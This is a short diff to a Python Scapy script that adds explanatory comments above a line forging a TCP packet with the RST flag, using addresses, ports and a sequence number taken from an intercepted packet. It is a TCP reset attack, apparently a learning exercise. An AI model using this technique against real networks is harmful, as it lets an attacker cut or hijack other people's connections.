@@ -24,6 +24,9 @@ flags = "R"
 seq = packet[TCP].ack
 
 # Create the reset hijacking packet
+# The IP layer the source and destionation IP
+# The TCP layer has the source and destionation ports, the "RST" flag and the sequence number
+# derived from the intercepted packet
 hijack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags=flags, seq=seq)
 
 # Bamboozle
